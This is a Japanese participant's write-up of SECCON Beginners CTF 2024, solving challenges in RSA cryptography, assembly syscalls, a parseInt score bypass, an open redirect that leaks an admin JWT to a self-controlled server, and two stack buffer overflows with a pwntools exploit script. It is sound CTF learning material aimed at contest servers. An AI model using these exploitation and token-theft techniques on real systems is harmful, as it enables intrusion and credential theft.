---
title: "SECCON Beginners CTF 2024 WriteUp"
createdAt: "2024-06-19"
category:
  - "CTF"
---

2024 年 6 月 8 日 ~9 日に開催された SECCON Beginners CTF 2024 に参加しました。

結果は４問正解で 285 ポイント、全 962 チーム中 303 位でした。

# crypto

## **Safe Prime**

与えられた`chell.py` を確認してみると`q` が`p` の計算式で作られていることがわかります。

`n` は`output.txt` で与えられているため、`p` と`q`の値が求められそうです。

`p` `q` `n` から方程式を求めると以下が作れます。

$$
2p^2+p−n=0
$$

これを解の公式を使って解きます。

$$
p=\frac{−b±\sqrt{b^2−4ac}}{2a}
$$

Python で書きました。

```python
import math
import gmpy2
from Crypto.Util.number import *

n = 292927367433510948901751902057717800692038691293351366163009654796102787183601223853665784238601655926920628800436003079044921928983307813012149143680956641439800408783429996002829316421340550469318295239640149707659994033143360850517185860496309968947622345912323183329662031340775767654881876683235701491291

# pを求める
sqrt_value = math.isqrt(1 + 8 * n)
p = (-1 + sqrt_value) // 4

# pがわかればqがわかる
q = n // p
e = 65537
totient_n = (p-1)*(q-1) # オイラー関数

# p,q,eがわかれば秘密鍵が求められる
d = gmpy2.invert(e,totient_n)

# 秘密鍵がわかれば暗号文を復号化できる
c = 40791470236110804733312817275921324892019927976655404478966109115157033048751614414177683787333122984170869148886461684367352872341935843163852393126653174874958667177632653833127408726094823976937236033974500273341920433616691535827765625224845089258529412235827313525710616060854484132337663369013424587861
plaintext = pow(c,d,n)
print(long_to_bytes(plaintext))
```

`ctf4b{R3l4ted_pr1m3s_4re_vuLner4ble_n0_maTt3r_h0W_l4rGe_p_1s}`

## math（未）

実は[actordb.com/](http://www.factordb.com/)で`n`が素因数分解できた。

# reversing

## assemble（未）

> **Challenge 1. Please write 0x123 to RAX!**
>
> 1. Only **mov**, **push**, **syscall** instructions can be used.
>
> 2. The number of instructions should be less than 25.

```python
mov RAX, 0x123
```

> **Challenge 2. Please write 0x123 to RAX and push it on stack!**
>
> 1. Only **mov**, **push**, **syscall** instructions can be used.
>
> 2. The number of instructions should be less than 25.

```python
mov RAX, 0x123
push RAX
```

> **Challenge 3. Please use syscall to print Hello on stdout!**
>
> 1. Only **mov**, **push**, **syscall** instructions can be used.
>
> 2. The number of instructions should be less than 25.

```python
mov rax, 1
mov rdi, 1
mov rbx, 0x0A6F6C6C6548
push rbx
mov rsi, rsp
mov rdx, 6
syscall
```

> **Challenge 4. Please read flag.txt file and print it to stdout!**
>
> 1. Only **mov**, **push**, **syscall** instructions can be used.
>
> 2. The number of instructions should be less than 25.

これが時間内に解けなかった。

ファイルオープンのシステムコールは、ファイル名を読み取る際、NULL 終端を見つけるまでメモリを読み続けるらしい。

そのため、`push 0x0` がないと、システムコールがファイル名の終わりを認識できず、メモリの不適切な部分を参照して`flag.txt` 以外の余分なデータが続いていると解釈されてしまう。

```python
mov rbx, 0x7478742e67616c66
**push 0x0**
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 52
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 52
syscall
```

**`ctf4b{gre4t_j0b_y0u_h4ve_m4stered_4ssemb1y_14ngu4ge}`**

# misc

## **getRank**

与えられたソースコードを確認すると、以下のようなアプリケーションのようです。

- ランダムに決められた 0~9 の数字を推測する
- 推測できれば 1 点加算する
- 点数が 10\*\*255 以上になればランク１を獲得できる
- ランク１になればフラグが獲得できる

点数は burp suite などのプロキシを使えば任意の値を入れられますが、以下の条件があり直接 10\*\*255 以上の値を入れてもランク 1 を獲得できません。

- 入力の長さが 300 以下であること
- 点数が 10**255 より大きければ、点数から 10**100 除算する

なんだかなといろいろ探していると、`parseInt()` は 16 進数でも変換可能なことがわかりました。

なので 16 進数で上記の条件を満たす値を計算しました。

```python
> hex(10**355 + 1)
'0x9be64e16d66aaa9170869e228988c87ba0402978eec789f28abc4e0bea832d6cfdd5c2410327aa8d5c269de4f60fee5dc6a3186bf4a47f9b7fe1d13095775bf95a6e0e0e27bf2da9e2d1b8a60001bc7e077868f6fbee203e2fffcc53b0db8bea1e042d9710907e80000000000000000000000000000000000000000000000000000000000000000000000000000000000000001'
```

これを burp suite を使って指定してあげるとフラグが確認できました。

# WEB

## **wooorker（未）**

admin で`/` にログインできればフラグが取れる問題。

ソースコードを見てみると`admin` の他に`guest` がユーザーとして用意されており`guest` についてはパスワードもわかっている。さっそくログインしてみると、URL に JWT が発行される。

noneAttack かなと思いやってみるもうまく行かず、ここで時間切れ

```jsx
const next = params.get("next");
if (next) {
  window.location.href = next.includes("token=")
    ? next
    : `${next}?token=${token}`;
} else {
  window.location.href = `/?token=${token}`;
}
```

`?next=https://test/index` というクエリパラメータを指定すると、ログイン後に`https://test/index`にリダイレクトすることができるらしい。

また、今回はクローラーが存在しています。クローラーは`login?next=/` を送信すると、`https://woorker.quals.beginners.seccon.jp/login?next=/` に admin としてアクセスます。そこで`https://woorker.quals.beginners.seccon.jp/login?next=[自身が管理するサーバー]` とすることで admin の JWT トークンが付与された状態で自身が管理するサーバーにリダイレクトされます。

リダイレクト先のサーバーは RequestBin を使用しました。

あとは burp を利用して、取得した JWT トークンを HTTP ヘッダに設定して`/flag` にアクセスするとフラグが取れました。

# pwn

## **simpleoverflow**

与えられた`src.c` を確認すると、`buf` にスタックオーバーフローの脆弱性があり、10 文字以上の入力値を与えられると`is_admin` が書き換えられてしまいます。

```c
int main() {
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10);
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
}
```

以下のように 10 文字以上の文字列を入力するとフラグが確認できました。

```bash
$ nc simpleoverflow.beginners.seccon.games 9000
name:aaaaaaaaaa1
Hello, aaaaaaaaaa1

ctf4b{0n_y0ur_m4rk}
```

## **simpleoverwrite**

ッファオーバーフローの脆弱性を使って`main()`のリターンアドレスを書き換えて`win()` を呼ぶ問題です。

gdb でスタックの内容を確認すると以下のようになっていました。

```python
[-------------------------------------code-------------------------------------]
   0x4011fd <main+46>:	mov    edx,0x20
   0x401202 <main+51>:	mov    rsi,rax
   0x401205 <main+54>:	mov    edi,0x0
=> 0x40120a <main+59>:	call   0x401060 <read@plt>
   0x40120f <main+64>:	lea    rax,[rbp-0xa]
   0x401213 <main+68>:	mov    rsi,rax
   0x401216 <main+71>:	lea    rax,[rip+0xdfb]        # 0x402018
   0x40121d <main+78>:	mov    rdi,rax
Guessed arguments:
arg[0]: 0x0
arg[1]: 0x7fffffffde06 --> 0x0
arg[2]: 0x20 (' ')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde00 --> 0x1000
0008| 0x7fffffffde08 --> 0x0
0016| 0x7fffffffde10 --> 0x1
0024| 0x7fffffffde18 --> 0x7ffff7c29d90 (<__libc_start_call_main+128>:	mov    edi,eax)
0032| 0x7fffffffde20 --> 0x0
0040| 0x7fffffffde28 --> 0x4011cf (<main>:	push   rbp)
0048| 0x7fffffffde30 --> 0x100000000
0056| 0x7fffffffde38 --> 0x7fffffffdf28 --> 0x7fffffffe26f ("/home/d/WorkSpace/CTF/SECCON_Beginners_CTF_2024/pwn/simpleoverwrite/simpleoverwrite/chall")
[------------------------------------------------------------------------------]
```

なので適当な 18 文字のあとに`win()`のアドレスを入力すれば良さそうです。

`win()` のアドレスは以下のコマンドで見つけられます。

```python
$ objdump -d ./chall | grep "<win>"
0000000000401186 <win>:
```

python でスクリプトを書きます。

```python
from pwn import *
r = remote("simpleoverwrite.beginners.seccon.games", 9001)

win = 0x401186
win=p64(0x0000000000401186) # p64でintをbytes型に変換

attack = b'a'*18 + win

print(r.recvuntil("input:"))
r.sendline(attack)

r.interactive() # 対話モードに入る
```

`ctf4b{B3l13v3_4g41n}`
